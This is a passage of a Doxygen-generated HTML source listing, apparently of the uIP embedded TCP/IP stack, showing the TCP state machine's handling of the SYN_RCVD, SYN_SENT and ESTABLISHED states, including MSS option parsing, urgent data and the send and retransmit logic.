<a name="l01470"></a>01470 <span class="comment">       we are waiting for an ACK that acknowledges the data we sent</span>
<a name="l01471"></a>01471 <span class="comment">       out the last time. Therefore, we want to have the UIP_ACKDATA</span>
<a name="l01472"></a>01472 <span class="comment">       flag set. If so, we enter the ESTABLISHED state. */</span>
<a name="l01473"></a>01473     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; <a class="code" href="a00150.html#g6bfa488f87f68a6f7f4a3efb9e45eaf8">UIP_ACKDATA</a>) {
<a name="l01474"></a>01474       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a>;
<a name="l01475"></a>01475       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf84316f469ce0726985c0702db49a989">UIP_CONNECTED</a>;
<a name="l01476"></a>01476       uip_connr-&gt;len = 0;
<a name="l01477"></a>01477       <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01478"></a>01478         <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> |= <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>;
<a name="l01479"></a>01479         uip_add_rcv_nxt(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01480"></a>01480       }
<a name="l01481"></a>01481       <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01482"></a>01482       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01483"></a>01483       <span class="keywordflow">goto</span> appsend;
<a name="l01484"></a>01484     }
<a name="l01485"></a>01485     <span class="keywordflow">goto</span> drop;
<a name="l01486"></a>01486 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l01487"></a>01487 <span class="preprocessor"></span>  <span class="keywordflow">case</span> <a class="code" href="a00150.html#g8af482dec973db57d8b3bd3f69461488">UIP_SYN_SENT</a>:
<a name="l01488"></a>01488     <span class="comment">/* In SYN_SENT, we wait for a SYNACK that is sent in response to</span>
<a name="l01489"></a>01489 <span class="comment">       our SYN. The rcv_nxt is set to sequence number in the SYNACK</span>
<a name="l01490"></a>01490 <span class="comment">       plus one, and we send an ACK. We move into the ESTABLISHED</span>
<a name="l01491"></a>01491 <span class="comment">       state. */</span>
<a name="l01492"></a>01492     <span class="keywordflow">if</span>((<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) &amp;&amp;
<a name="l01493"></a>01493        (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g1425d4a0c2760adb653a04c0fb137a8d">TCP_CTL</a>) == (<a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>)) {
<a name="l01494"></a>01494 
<a name="l01495"></a>01495       <span class="comment">/* Parse the TCP MSS option, if present. */</span>
<a name="l01496"></a>01496       <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset &amp; 0xf0) &gt; 0x50) {
<a name="l01497"></a>01497         <span class="keywordflow">for</span>(c = 0; c &lt; ((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset &gt;&gt; 4) - 5) &lt;&lt; 2 ;) {
<a name="l01498"></a>01498           opt = <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + c];
<a name="l01499"></a>01499           <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g1215163245304bad20d6c5608ad75ab7">TCP_OPT_END</a>) {
<a name="l01500"></a>01500             <span class="comment">/* End of options. */</span>
<a name="l01501"></a>01501             <span class="keywordflow">break</span>;
<a name="l01502"></a>01502           } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g9f1822e1d231235edacad691f3cb7bbb">TCP_OPT_NOOP</a>) {
<a name="l01503"></a>01503             ++c;
<a name="l01504"></a>01504             <span class="comment">/* NOP option. */</span>
<a name="l01505"></a>01505           } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g691688604655ea8943d15f14c60027d8">TCP_OPT_MSS</a> &amp;&amp;
<a name="l01506"></a>01506                     <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c] == TCP_OPT_MSS_LEN) {
<a name="l01507"></a>01507             <span class="comment">/* An MSS option with the right option length. */</span>
<a name="l01508"></a>01508             tmp16 = (<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 2 + c] &lt;&lt; 8) |
<a name="l01509"></a>01509               <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 3 + c];
<a name="l01510"></a>01510             uip_connr-&gt;initialmss =
<a name="l01511"></a>01511               uip_connr-&gt;mss = tmp16 &gt; <a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>? <a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>: tmp16;
<a name="l01512"></a>01512 
<a name="l01513"></a>01513             <span class="comment">/* And we are done processing options. */</span>
<a name="l01514"></a>01514             <span class="keywordflow">break</span>;
<a name="l01515"></a>01515           } <span class="keywordflow">else</span> {
<a name="l01516"></a>01516             <span class="comment">/* All other options have a length field, so that we easily</span>
<a name="l01517"></a>01517 <span class="comment">               can skip past them. */</span>
<a name="l01518"></a>01518             <span class="keywordflow">if</span>(<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c] == 0) {
<a name="l01519"></a>01519               <span class="comment">/* If the length field is zero, the options are malformed</span>
<a name="l01520"></a>01520 <span class="comment">                 and we don't process them further. */</span>
<a name="l01521"></a>01521               <span class="keywordflow">break</span>;
<a name="l01522"></a>01522             }
<a name="l01523"></a>01523             c += <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c];
<a name="l01524"></a>01524           }
<a name="l01525"></a>01525         }
<a name="l01526"></a>01526       }
<a name="l01527"></a>01527       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a>;
<a name="l01528"></a>01528       uip_connr-&gt;rcv_nxt[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0];
<a name="l01529"></a>01529       uip_connr-&gt;rcv_nxt[1] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1];
<a name="l01530"></a>01530       uip_connr-&gt;rcv_nxt[2] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2];
<a name="l01531"></a>01531       uip_connr-&gt;rcv_nxt[3] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3];
<a name="l01532"></a>01532       uip_add_rcv_nxt(1);
<a name="l01533"></a>01533       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf84316f469ce0726985c0702db49a989">UIP_CONNECTED</a> | <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>;
<a name="l01534"></a>01534       uip_connr-&gt;len = 0;
<a name="l01535"></a>01535       <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = 0;
<a name="l01536"></a>01536       <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01537"></a>01537       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01538"></a>01538       <span class="keywordflow">goto</span> appsend;
<a name="l01539"></a>01539     }
<a name="l01540"></a>01540     <span class="comment">/* Inform the application that the connection failed */</span>
<a name="l01541"></a>01541     <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#ga4c4310e54f18541b09e1e251fe7b22d">UIP_ABORT</a>;
<a name="l01542"></a>01542     <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01543"></a>01543     <span class="comment">/* The connection is closed after we send the RST */</span>
<a name="l01544"></a>01544     <a class="code" href="a00088.html">uip_conn</a>-&gt;tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l01545"></a>01545     <span class="keywordflow">goto</span> reset;
<a name="l01546"></a>01546 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l01547"></a>01547     
<a name="l01548"></a>01548   <span class="keywordflow">case</span> <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a>:
<a name="l01549"></a>01549     <span class="comment">/* In the ESTABLISHED state, we call upon the application to feed</span>
<a name="l01550"></a>01550 <span class="comment">    data into the uip_buf. If the UIP_ACKDATA flag is set, the</span>
<a name="l01551"></a>01551 <span class="comment">    application should put new data into the buffer, otherwise we are</span>
<a name="l01552"></a>01552 <span class="comment">    retransmitting an old segment, and the application should put that</span>
<a name="l01553"></a>01553 <span class="comment">    data into the buffer.</span>
<a name="l01554"></a>01554 <span class="comment"></span>
<a name="l01555"></a>01555 <span class="comment">    If the incoming packet is a FIN, we should close the connection on</span>
<a name="l01556"></a>01556 <span class="comment">    this side as well, and we send out a FIN and enter the LAST_ACK</span>
<a name="l01557"></a>01557 <span class="comment">    state. We require that there is no outstanding data; otherwise the</span>
<a name="l01558"></a>01558 <span class="comment">    sequence numbers will be screwed up. */</span>
<a name="l01559"></a>01559 
<a name="l01560"></a>01560     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a> &amp;&amp; !(uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#gde29ec025e6754afd8cc24c954a8dec8">UIP_STOPPED</a>)) {
<a name="l01561"></a>01561       <span class="keywordflow">if</span>(<a class="code" href="a00147.html#gef14e83c046e19ab9fe9d1bbcca276c2">uip_outstanding</a>(uip_connr)) {
<a name="l01562"></a>01562         <span class="keywordflow">goto</span> drop;
<a name="l01563"></a>01563       }
<a name="l01564"></a>01564       uip_add_rcv_nxt(1 + <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01565"></a>01565       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> |= <a class="code" href="a00150.html#g57e6dc1d58a36d0ed53a3dd29ccc5798">UIP_CLOSE</a>;
<a name="l01566"></a>01566       <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01567"></a>01567         <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> |= <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>;
<a name="l01568"></a>01568       }
<a name="l01569"></a>01569       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01570"></a>01570       uip_connr-&gt;len = 1;
<a name="l01571"></a>01571       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gd135fb0cfdfb2c212f0f51865a3640e4">UIP_LAST_ACK</a>;
<a name="l01572"></a>01572       uip_connr-&gt;nrtx = 0;
<a name="l01573"></a>01573     tcp_send_finack:
<a name="l01574"></a>01574       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01575"></a>01575       <span class="keywordflow">goto</span> tcp_send_nodata;
<a name="l01576"></a>01576     }
<a name="l01577"></a>01577 
<a name="l01578"></a>01578     <span class="comment">/* Check the URG flag. If this is set, the segment carries urgent</span>
<a name="l01579"></a>01579 <span class="comment">       data that we must pass to the application. */</span>
<a name="l01580"></a>01580     <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#gc84f499cba8a02fc0e306c10b2acabf0">TCP_URG</a>) != 0) {
<a name="l01581"></a>01581 <span class="preprocessor">#if UIP_URGDATA &gt; 0</span>
<a name="l01582"></a>01582 <span class="preprocessor"></span>      uip_urglen = (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[0] &lt;&lt; 8) | <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[1];
<a name="l01583"></a>01583       <span class="keywordflow">if</span>(uip_urglen &gt; <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>) {
<a name="l01584"></a>01584         <span class="comment">/* There is more urgent data in the next segment to come. */</span>
<a name="l01585"></a>01585         uip_urglen = <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>;
<a name="l01586"></a>01586       }
<a name="l01587"></a>01587       uip_add_rcv_nxt(uip_urglen);
<a name="l01588"></a>01588       <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> -= uip_urglen;
<a name="l01589"></a>01589       uip_urgdata = <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a>;
<a name="l01590"></a>01590       <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> += uip_urglen;
<a name="l01591"></a>01591     } <span class="keywordflow">else</span> {
<a name="l01592"></a>01592       uip_urglen = 0;
<a name="l01593"></a>01593 <span class="preprocessor">#else </span><span class="comment">/* UIP_URGDATA &gt; 0 */</span>
<a name="l01594"></a>01594       <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = ((<span class="keywordtype">char</span> *)<a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a>) + ((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[0] &lt;&lt; 8) | <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[1]);
<a name="l01595"></a>01595       <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> -= (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[0] &lt;&lt; 8) | <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[1];
<a name="l01596"></a>01596 #endif <span class="comment">/* UIP_URGDATA &gt; 0 */</span>
<a name="l01597"></a>01597     }
<a name="l01598"></a>01598 
<a name="l01599"></a>01599     <span class="comment">/* If uip_len &gt; 0 we have TCP data in the packet, and we flag this</span>
<a name="l01600"></a>01600 <span class="comment">       by setting the UIP_NEWDATA flag and update the sequence number</span>
<a name="l01601"></a>01601 <span class="comment">       we acknowledge. If the application has stopped the dataflow</span>
<a name="l01602"></a>01602 <span class="comment">       using uip_stop(), we must not accept any data packets from the</span>
<a name="l01603"></a>01603 <span class="comment">       remote host. */</span>
<a name="l01604"></a>01604     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0 &amp;&amp; !(uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#gde29ec025e6754afd8cc24c954a8dec8">UIP_STOPPED</a>)) {
<a name="l01605"></a>01605       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> |= <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>;
<a name="l01606"></a>01606       uip_add_rcv_nxt(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01607"></a>01607     }
<a name="l01608"></a>01608 
<a name="l01609"></a>01609     <span class="comment">/* Check if the available buffer space advertised by the other end</span>
<a name="l01610"></a>01610 <span class="comment">       is smaller than the initial MSS for this connection. If so, we</span>
<a name="l01611"></a>01611 <span class="comment">       set the current MSS to the window size to ensure that the</span>
<a name="l01612"></a>01612 <span class="comment">       application does not send more data than the other end can</span>
<a name="l01613"></a>01613 <span class="comment">       handle.</span>
<a name="l01614"></a>01614 <span class="comment"></span>
<a name="l01615"></a>01615 <span class="comment">       If the remote host advertises a zero window, we set the MSS to</span>
<a name="l01616"></a>01616 <span class="comment">       the initial MSS so that the application will send an entire MSS</span>
<a name="l01617"></a>01617 <span class="comment">       of data. This data will not be acknowledged by the receiver,</span>
<a name="l01618"></a>01618 <span class="comment">       and the application will retransmit it. This is called the</span>
<a name="l01619"></a>01619 <span class="comment">       "persistent timer" and uses the retransmission mechanim.</span>
<a name="l01620"></a>01620 <span class="comment">    */</span>
<a name="l01621"></a>01621     tmp16 = ((<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[0] &lt;&lt; 8) + (<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[1];
<a name="l01622"></a>01622     <span class="keywordflow">if</span>(tmp16 &gt; uip_connr-&gt;initialmss ||
<a name="l01623"></a>01623        tmp16 == 0) {
<a name="l01624"></a>01624       tmp16 = uip_connr-&gt;initialmss;
<a name="l01625"></a>01625     }
<a name="l01626"></a>01626     uip_connr-&gt;mss = tmp16;
<a name="l01627"></a>01627 
<a name="l01628"></a>01628     <span class="comment">/* If this packet constitutes an ACK for outstanding data (flagged</span>
<a name="l01629"></a>01629 <span class="comment">       by the UIP_ACKDATA flag, we should call the application since it</span>
<a name="l01630"></a>01630 <span class="comment">       might want to send more data. If the incoming packet had data</span>
<a name="l01631"></a>01631 <span class="comment">       from the peer (as flagged by the UIP_NEWDATA flag), the</span>
<a name="l01632"></a>01632 <span class="comment">       application must also be notified.</span>
<a name="l01633"></a>01633 <span class="comment"></span>
<a name="l01634"></a>01634 <span class="comment">       When the application is called, the global variable uip_len</span>
<a name="l01635"></a>01635 <span class="comment">       contains the length of the incoming data. The application can</span>
<a name="l01636"></a>01636 <span class="comment">       access the incoming data through the global pointer</span>
<a name="l01637"></a>01637 <span class="comment">       uip_appdata, which usually points UIP_IPTCPH_LEN + UIP_LLH_LEN</span>
<a name="l01638"></a>01638 <span class="comment">       bytes into the uip_buf array.</span>
<a name="l01639"></a>01639 <span class="comment"></span>
<a name="l01640"></a>01640 <span class="comment">       If the application wishes to send any data, this data should be</span>
<a name="l01641"></a>01641 <span class="comment">       put into the uip_appdata and the length of the data should be</span>
<a name="l01642"></a>01642 <span class="comment">       put into uip_len. If the application don't have any data to</span>
<a name="l01643"></a>01643 <span class="comment">       send, uip_len must be set to 0. */</span>
<a name="l01644"></a>01644     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; (<a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a> | UIP_ACKDATA)) {
<a name="l01645"></a>01645       <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01646"></a>01646       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01647"></a>01647 
<a name="l01648"></a>01648     appsend:
<a name="l01649"></a>01649       
<a name="l01650"></a>01650       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; <a class="code" href="a00150.html#ga4c4310e54f18541b09e1e251fe7b22d">UIP_ABORT</a>) {
<a name="l01651"></a>01651         <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01652"></a>01652         uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l01653"></a>01653         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">TCP_RST</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01654"></a>01654         <span class="keywordflow">goto</span> tcp_send_nodata;
<a name="l01655"></a>01655       }
<a name="l01656"></a>01656 
<a name="l01657"></a>01657       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; <a class="code" href="a00150.html#g57e6dc1d58a36d0ed53a3dd29ccc5798">UIP_CLOSE</a>) {
<a name="l01658"></a>01658         <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01659"></a>01659         uip_connr-&gt;len = 1;
<a name="l01660"></a>01660         uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#ga533c394b1fa0030205534befa31c525">UIP_FIN_WAIT_1</a>;
<a name="l01661"></a>01661         uip_connr-&gt;nrtx = 0;
<a name="l01662"></a>01662         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01663"></a>01663         <span class="keywordflow">goto</span> tcp_send_nodata;
<a name="l01664"></a>01664       }
<a name="l01665"></a>01665 
<a name="l01666"></a>01666       <span class="comment">/* If uip_slen &gt; 0, the application has data to be sent. */</span>
<a name="l01667"></a>01667       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> &gt; 0) {
<a name="l01668"></a>01668 
<a name="l01669"></a>01669         <span class="comment">/* If the connection has acknowledged data, the contents of</span>
<a name="l01670"></a>01670 <span class="comment">           the -&gt;len variable should be discarded. */</span>
<a name="l01671"></a>01671         <span class="keywordflow">if</span>((<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) != 0) {
<a name="l01672"></a>01672           uip_connr-&gt;len = 0;
<a name="l01673"></a>01673         }
<a name="l01674"></a>01674 
<a name="l01675"></a>01675         <span class="comment">/* If the -&gt;len variable is non-zero the connection has</span>
<a name="l01676"></a>01676 <span class="comment">           already data in transit and cannot send anymore right</span>
<a name="l01677"></a>01677 <span class="comment">           now. */</span>
<a name="l01678"></a>01678         <span class="keywordflow">if</span>(uip_connr-&gt;len == 0) {
<a name="l01679"></a>01679 
<a name="l01680"></a>01680           <span class="comment">/* The application cannot send more than what is allowed by</span>
<a name="l01681"></a>01681 <span class="comment">             the mss (the minumum of the MSS and the available</span>
<a name="l01682"></a>01682 <span class="comment">             window). */</span>
<a name="l01683"></a>01683           <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> &gt; uip_connr-&gt;mss) {
<a name="l01684"></a>01684             <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = uip_connr-&gt;mss;
<a name="l01685"></a>01685           }
<a name="l01686"></a>01686 
<a name="l01687"></a>01687           <span class="comment">/* Remember how much data we send out now so that we know</span>
<a name="l01688"></a>01688 <span class="comment">             when everything has been acknowledged. */</span>
<a name="l01689"></a>01689           uip_connr-&gt;len = <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a>;
<a name="l01690"></a>01690         } <span class="keywordflow">else</span> {
<a name="l01691"></a>01691 
<a name="l01692"></a>01692           <span class="comment">/* If the application already had unacknowledged data, we</span>
<a name="l01693"></a>01693 <span class="comment">             make sure that the application does not send (i.e.,</span>
<a name="l01694"></a>01694 <span class="comment">             retransmit) out more than it previously sent out. */</span>
<a name="l01695"></a>01695           <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = uip_connr-&gt;len;
<a name="l01696"></a>01696         }
<a name="l01697"></a>01697       }
<a name="l01698"></a>01698       uip_connr-&gt;nrtx = 0;
<a name="l01699"></a>01699     apprexmit:
<a name="l01700"></a>01700       <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = <a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a>;
<a name="l01701"></a>01701       
<a name="l01702"></a>01702       <span class="comment">/* If the application has data to be sent, or if the incoming</span>
<a name="l01703"></a>01703 <span class="comment">         packet had new data in it, we must send out a packet. */</span>
<a name="l01704"></a>01704       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> &gt; 0 &amp;&amp; uip_connr-&gt;len &gt; 0) {
<a name="l01705"></a>01705         <span class="comment">/* Add the length of the IP and TCP headers. */</span>
<a name="l01706"></a>01706         <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = uip_connr-&gt;len + <a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a>;
<a name="l01707"></a>01707         <span class="comment">/* We always set the ACK flag in response packets. */</span>
<a name="l01708"></a>01708         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a> | <a class="code" href="a00150.html#g1320fd0006a2f70138bc2d0018dda829">TCP_PSH</a>;
<a name="l01709"></a>01709         <span class="comment">/* Send the packet. */</span>
<a name="l01710"></a>01710         <span class="keywordflow">goto</span> tcp_send_noopts;
<a name="l01711"></a>01711       }
<a name="l01712"></a>01712       <span class="comment">/* If there is no data to send, just send out a pure ACK if</span>
<a name="l01713"></a>01713 <span class="comment">         there is newdata. */</span>
<a name="l01714"></a>01714       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>) {
<a name="l01715"></a>01715         <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a>;
<a name="l01716"></a>01716         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01717"></a>01717         <span class="keywordflow">goto</span> tcp_send_noopts;
<a name="l01718"></a>01718       }
<a name="l01719"></a>01719     }
<a name="l01720"></a>01720     <span class="keywordflow">goto</span> drop;
<a name="l01721"></a>01721   <span class="keywordflow">case</span> <a class="code" href="a00150.html#gd135fb0cfdfb2c212f0f51865a3640e4">UIP_LAST_ACK</a>:
